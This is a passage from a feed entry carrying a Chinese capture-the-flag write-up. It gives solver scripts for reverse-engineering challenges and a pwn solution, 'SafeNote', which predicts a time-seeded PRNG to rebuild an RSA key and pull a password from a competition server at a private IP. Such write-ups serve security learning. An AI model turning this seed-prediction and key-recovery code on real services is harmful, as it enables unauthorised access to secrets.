class="hljs-number">0x8D9DDD875EA2D7C5</span>,<span class="hljs-number">0x66EE9790CD81C9F9</span>,<span class="hljs-number">0x370874C63F424FDA</span>,<span class="hljs-number">0xB93283E32677CB25</span>,\<br>    <span class="hljs-number">0xBA2D4ED544F2D3BD</span>,<span class="hljs-number">0xBFE421121E049862</span>,<span class="hljs-number">0xA31694FDF486F647</span>,<span class="hljs-number">0x430251B27C701FEB</span>,<span class="hljs-number">0x5DE26B097ECC1522</span>,<span class="hljs-number">0xF157EDD4B5BE9BBB</span>]<br>table=<span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> v7:<br>  table+=i.to_bytes(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>table=<span class="hljs-built_in">list</span>(table)<br>enc=[<span class="hljs-number">109</span>,-<span class="hljs-number">73</span>,-<span class="hljs-number">72</span>,<span class="hljs-number">46</span>,-<span class="hljs-number">73</span>,-<span class="hljs-number">5</span>,<span class="hljs-number">99</span>,-<span class="hljs-number">100</span>,<span class="hljs-number">46</span>,<span class="hljs-number">59</span>,<span class="hljs-number">32</span>,-<span class="hljs-number">76</span>,<span class="hljs-number">109</span>,<span class="hljs-number">3</span>,<span class="hljs-number">59</span>,<span class="hljs-number">20</span>,-<span class="hljs-number">61</span>,-<span class="hljs-number">56</span>,\<br>     -<span class="hljs-number">119</span>,<span class="hljs-number">48</span>,<span class="hljs-number">100</span>,<span class="hljs-number">118</span>,<span class="hljs-number">36</span>,<span class="hljs-number">118</span>,<span class="hljs-number">82</span>,<span class="hljs-number">3</span>,<span class="hljs-number">95</span>,<span class="hljs-number">106</span>,<span class="hljs-number">14</span>,-<span class="hljs-number">80</span>,<span class="hljs-number">5</span>,-<span class="hljs-number">89</span>,<span class="hljs-number">89</span>,-<span class="hljs-number">85</span>,<span class="hljs-number">5</span>,<span class="hljs-number">14</span>,<span class="hljs-number">46</span>,-<span class="hljs-number">73</span>,<span class="hljs-number">7</span>,<span class="hljs-number">127</span>]<br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(enc):<br>  enc[i]=v&amp;<span class="hljs-number">0xff</span><br><br>flag=[]<br>flag.insert(<span class="hljs-number">0</span>,table.index(enc[-<span class="hljs-number">1</span>]))<br>ind=<span class="hljs-built_in">len</span>(enc)-<span class="hljs-number">2</span><br><span class="hljs-keyword">while</span> ind&gt;=<span class="hljs-number">0</span>:<br>  flag.insert(<span class="hljs-number">0</span>,table.index(enc[ind])^flag[<span class="hljs-number">0</span>])<br>  ind-=<span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(flag))<br></code></pre></td></tr></table></figure><h2 id="决赛-Ez8or"><a href="#决赛-Ez8or" class="headerlink" title="决赛[Ez8or]"></a>决赛[Ez8or]</h2><p>加密数据再次异或后得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br>a=[  <span class="hljs-number">168</span>, <span class="hljs-number">172</span>,  <span class="hljs-number">54</span>, <span class="hljs-number">106</span>, <span class="hljs-number">196</span>,  <span class="hljs-number">10</span>, <span class="hljs-number">154</span>, <span class="hljs-number">220</span>,  <span class="hljs-number">18</span>,  <span class="hljs-number">72</span>,<br>  <span class="hljs-number">242</span>,  <span class="hljs-number">96</span>, <span class="hljs-number">203</span>, <span class="hljs-number">204</span>,  <span class="hljs-number">58</span>,  <span class="hljs-number">94</span>, <span class="hljs-number">242</span>,  <span class="hljs-number">99</span>, <span class="hljs-number">156</span>, <span class="hljs-number">148</span>,<br>  <span class="hljs-number">245</span>,  <span class="hljs-number">72</span>, <span class="hljs-number">205</span>,  <span class="hljs-number">23</span>, <span class="hljs-number">130</span>, <span class="hljs-number">205</span>, <span class="hljs-number">247</span>, <span class="hljs-number">113</span>, <span class="hljs-number">159</span>,  <span class="hljs-number">54</span>,<br>  <span class="hljs-number">180</span>, <span class="hljs-number">136</span>, <span class="hljs-number">175</span>,  <span class="hljs-number">95</span>, <span class="hljs-number">221</span>, <span class="hljs-number">100</span>, <span class="hljs-number">133</span>, <span class="hljs-number">150</span>, <span class="hljs-number">247</span>,  <span class="hljs-number">94</span>,<br>  <span class="hljs-number">196</span>,   <span class="hljs-number">9</span>, <span class="hljs-number">173</span>, <span class="hljs-number">221</span>, <span class="hljs-number">171</span>,  <span class="hljs-number">22</span>, <span class="hljs-number">153</span>,  <span class="hljs-number">96</span>, <span class="hljs-number">155</span>, <span class="hljs-number">222</span>,<br>  <span class="hljs-number">245</span>,  <span class="hljs-number">83</span>, <span class="hljs-number">195</span>,  <span class="hljs-number">33</span>, <span class="hljs-number">252</span>, <span class="hljs-number">128</span>, <span class="hljs-number">248</span>,  <span class="hljs-number">16</span>, <span class="hljs-number">199</span>,  <span class="hljs-number">38</span>]<br><br>p=process(<span class="hljs-string">&quot;./Ez8or&quot;</span>)<br>p.readuntil(<span class="hljs-string">&#x27;flag&#x27;</span>)<br>gdb.attach(p,<span class="hljs-string">&#x27;bp $rebase(0x1476)&#x27;</span>)<br><span class="hljs-comment"># 修改加密函数的参数为密文地址，函数结束后，查看密文地址处储存的信息</span><br>pause()<br>p.sendline(<span class="hljs-built_in">bytes</span>(a))<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="决赛-SafeNote"><a href="#决赛-SafeNote" class="headerlink" title="决赛[SafeNote]"></a>决赛[SafeNote]</h2><p>伪随机数，先获取密文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> CDLL<br><br>lib=CDLL(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>p=process(<span class="hljs-string">&quot;SafeNote&quot;</span>)<br>i=<span class="hljs-number">96</span><br><span class="hljs-keyword">while</span> i&gt;<span class="hljs-number">0</span>:<br>    p=remote(<span class="hljs-string">&quot;10.1.101.234&quot;</span>,<span class="hljs-number">9999</span>)<br>    t=lib.time(<span class="hljs-number">0</span>)<br>    p1=process(<span class="hljs-string">&quot;./a.out&quot;</span>)<br>    p1.sendline(<span class="hljs-built_in">str</span>(i))<br>    p.readuntil(<span class="hljs-string">&quot;N =&quot;</span>)<br>    d2=<span class="hljs-built_in">int</span>(p.readline())<br>    p.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.readuntil(<span class="hljs-string">&quot;password = &quot;</span>)<br>    d=<span class="hljs-built_in">int</span>(p.readline().strip().decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>    p1.send(<span class="hljs-built_in">str</span>(d))<br>    p1.readuntil(<span class="hljs-string">&#x27;n:&#x27;</span>)<br>    d1=<span class="hljs-built_in">int</span>(p1.readline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>).strip())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n(1): &quot;</span>+<span class="hljs-built_in">str</span>(d2))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n(2): &quot;</span>+<span class="hljs-built_in">str</span>(d1))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;nu: &quot;</span>+<span class="hljs-built_in">str</span>(i))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;time: &quot;</span>+<span class="hljs-built_in">str</span>(t))<br>    <span class="hljs-keyword">if</span> d2!=d1:<br>        p.close()<br>        p1.close()<br>        i-=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">break</span><br>p1.readuntil(<span class="hljs-string">&#x27;data:&#x27;</span>)<br>d=p1.readline()<br><span class="hljs-built_in">print</span>(d)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>rsa解密得到password，然后将password发送给靶机得到flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;gmp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">gmp_randstate_t</span> gmp_state;<br>__mpz_struct p,q,n_,e,p_1,q_1,lambda,d_;<br>__mpz_struct secret,msg;<br><span class="hljs-type">char</span>* data,data1;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>data=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x2000</span>);<br>data1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x2000</span>);<br>__gmpz_inits(&amp;p,&amp;q,&amp;n_,&amp;e,&amp;p_1,&amp;q_1,&amp;lambda,&amp;d_,&amp;secret,&amp;msg,<span class="hljs-number">0</span>);<br>__gmp_randinit_mt(&amp;gmp_state);<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> num=<span class="hljs-number">0</span>;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lld&quot;</span>,&amp;num);<br>__gmp_randseed_ui(&amp;gmp_state,time(<span class="hljs-number">0</span>)+num);<br>__gmpz_urandomb(&amp;q,&amp;gmp_state,<span class="hljs-number">256</span>);<br>__gmpz_nextprime(&amp;q,&amp;q);<br>__gmpz_urandomb(&amp;p,&amp;gmp_state,<span class="hljs-number">256</span>);<br>__gmpz_nextprime(&amp;p,&amp;p);<br> __gmpz_mul(&amp;n_, &amp;p, &amp;q);<br>  __gmpz_set_ui(&amp;e, <span class="hljs-number">65537LL</span>);<br>  __gmpz_sub_ui(&amp;p_1, &amp;p, <span class="hljs-number">1LL</span>);<br>  __gmpz_sub_ui(&amp;q_1, &amp;q, <span class="hljs-number">1LL</span>);<br>  __gmpz_lcm(&amp;lambda, &amp;p_1, &amp;q_1);<br>  __gmpz_invert(&amp;d_, &amp;e, &amp;lambda);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;n: %s\n&quot;</span>,__gmpz_get_str(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,&amp;n_));<br>read(<span class="hljs-number">0</span>,data,<span class="hljs-number">0x100</span>);<br>__gmpz_set_str(&amp;secret,data,<span class="hljs-number">10</span>);<br>__gmpz_powm(&amp;msg,&amp;secret,&amp;d_,&amp;n_);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data: %s\n&quot;</span>,__gmpz_get_str(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,&amp;msg));<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;初赛-easy-php&quot;&gt;&lt;a href=&quot;#初赛-easy-php&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    <category term="wp" scheme="https://www.dr0n.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.dr0n.top/tags/wp/"/>
    
    <category term="2023" scheme="https://www.dr0n.top/tags/2023/"/>
    
    <category term="浙江" scheme="https://www.dr0n.top/tags/%E6%B5%99%E6%B1%9F/"/>
    
  </entry>
  
</feed>
